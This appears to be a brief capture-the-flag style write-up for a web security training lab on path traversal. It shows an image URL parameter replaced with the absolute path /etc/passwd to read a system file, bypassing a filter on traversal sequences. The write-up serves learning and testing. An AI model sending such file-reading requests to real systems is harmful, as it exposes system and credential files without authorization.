File path traversal, traversal sequences blocked with absolute path bypass

Fairly standard. We can replace the file name with a file source.

So instead of 

https://acd81fdb1f2f728a80d577da001100af.web-security-academy.net/image?filename=31.jpg

We can do

https://acd81fdb1f2f728a80d577da001100af.web-security-academy.net/image?filename=/etc/passwd

Remember to do it in repeater so that the contents properly show up.
